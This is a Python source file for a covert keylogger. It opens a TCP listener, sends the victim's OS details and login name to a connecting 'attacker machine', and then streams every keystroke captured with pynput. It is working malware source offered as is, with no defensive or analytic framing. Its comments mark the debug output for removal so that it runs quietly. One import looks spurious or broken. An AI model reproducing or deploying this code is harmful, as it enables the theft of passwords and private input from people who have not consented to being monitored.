import platform,os,socket
from pynput import keyboard
from pynput.keyboard import Key
from webob import year

Ip = '0.0.0.0'
Port = 8083

def C_server(ip,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creating TCP-Ipv4 socket 
    #print('Socket has been created\n')# to be removed
    try:
        sock.bind((ip, port)) # Binding To (Ip,Port)
        #print('host Succesfully binded !\n')# to be removed
    except Exception as err: # error hundling
        #print ('Binding has failed. Error Code is : ',err)# to be removed
        exit()

    return sock # return socket object

def conn_hundler(sock):
    try :    
        sock.listen(1) # Listening For Connection From Attacker Machine
        connection_infos ,(client_host, client_port) = sock.accept() # Accepting connection and retrieving Connection Informations
        #print(f'Connection From: {client_host} on Port {client_port}\n')# to be removed
        connection_infos.sendall(f" Your Connected to a : {platform.uname().system} && version : {platform.uname().version} && User : {os.getlogin( )} \n".encode()) # sending Some Basic informations about "OS" of the Target
    except Exception as e : # error hundling 
        #print('failed to listen ! : '+e)# to be removed
        exit()

    return connection_infos # return connection informations 

def Sender(remote_host,data):
    try :
        remote_host.sendall(data.encode()) # Sending Informations encoded to the Attacker machine
        return True
    except Exception as e : # error hundling 
        #print(f'Error While Sending :{e} ')# to be removed
        exit()

def on_press(key):
    if key == Key.enter: # If It's A Special key ( Enter Key)
        #print(f" pressed : {pr_key} \n")# to be removed
        Sender(remote_host,'\n')   # send a '\n' for better formatting
        return True 
    if key == Key.space: # If It's A Special key ( Space Key)
        #print(f" pressed : {pr_key} \n")# to be removed
        Sender(remote_host,' ')   # send a '\n' for better formatting
        return True 
    if type(key) != type(Key.esc): # If It's Not A Special key
        #print(f" pressed : {pr_key} \n") # to be removed
        Sender(remote_host,str(key)) # sending informations
        return True 
    if type(key) == type(Key.esc): # If It's A Special key
        #print(f" pressed : {pr_key} \n")# to be removed
        Sender(remote_host,' '+str(key)+' ') # for better formatting 
        return True   

def wait_for_user_input():
    listener = keyboard.Listener(on_press=on_press) # creating listener object
    listener.start() # start the listener thread 
    listener.join() # wait till listener will stop
    # other stuff 

remote_host = conn_hundler(C_server(Ip,Port)) # to be used in on_press function {Remote Connection Informations}

print(wait_for_user_input()) # main
